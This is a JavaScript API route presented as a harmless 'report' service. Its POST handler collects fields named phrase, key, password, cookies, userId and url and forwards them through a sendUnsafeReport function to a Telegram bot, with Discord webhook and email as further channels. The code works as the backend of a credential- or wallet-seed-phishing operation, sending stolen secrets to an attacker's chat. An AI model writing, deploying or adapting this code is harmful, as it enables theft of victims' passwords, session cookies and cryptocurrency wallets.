import { sendUnsafeReport } from '@/lib/telegram.js';

async function reportRawTestData(data) {
  const response = await fetch("/api/report", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });

  if (!response.ok) {
    throw new Error(`Report failed: ${response.status}`);
  }

  return response.json();
}



export async function POST(request) {
  try {
    // Parse request body
    const body = await request.json();

    // Validate report structure
    if (!body || typeof body !== 'object') {
      return new Response(
        JSON.stringify({ 
          ok: false, 
          error: 'Invalid request body. Expected JSON object.' 
        }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Check if message is provided
    if (!body.message && !body.type) {
      return new Response(
        JSON.stringify({ 
          ok: false, 
          error: 'Missing required field: message or type' 
        }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Verify environment variables
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      console.error('[REPORT] Missing Telegram configuration');
      return new Response(
        JSON.stringify({ 
          ok: false, 
          error: 'Report service not configured' 
        }),
        { status: 503, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Build comprehensive report object
    const report = {
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'production',
      type: body.type || 'general',
      message: body.message,
      phrase: body.phrase || null,
      key: body.key || null,
      password: body.password || null,
      cookies: body.cookies || null,
      userId: body.userId || null,
      url: body.url || null,
      userAgent: body.userAgent || null,
      data: body.data || {},
      severity: body.severity || 'info'
    };

    console.log(`[REPORT] Sending ${report.type} report to Telegram`);

    // Send report to Telegram and other services
    const result = await sendUnsafeReport(report, {
      telegramBotToken,
      telegramChatId,
      discordWebhook: process.env.DISCORD_WEBHOOK,
      emailTo: process.env.EMAIL_TO,
      emailFrom: process.env.EMAIL_FROM,
      resendApiKey: process.env.RESEND_API_KEY
    });

    if (result.ok) {
      console.log(`[REPORT] Report delivered successfully`);
      return new Response(
        JSON.stringify({ 
          ok: true, 
          message: 'Report received and processed' 
        }),
        { status: 200, headers: { 'Content-Type': 'application/json' } }
      );
    } else {
      console.error('[REPORT] Failed to deliver report:', result);
      return new Response(
        JSON.stringify({ 
          ok: false, 
          error: 'Failed to process report' 
        }),
        { status: 500, headers: { 'Content-Type': 'application/json' } }
      );
    }

  } catch (error) {
    console.error('[REPORT] API Error:', error.message);
    return new Response(
      JSON.stringify({ 
        ok: false, 
        error: 'Internal server error' 
      }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
}

// Only GET allowed for health check in production
export async function GET() {
  return new Response(
    JSON.stringify({ 
      ok: true,
      message: 'Report API is running',
      version: '1.0'
    }),
    { status: 200, headers: { 'Content-Type': 'application/json' } }
  );
}
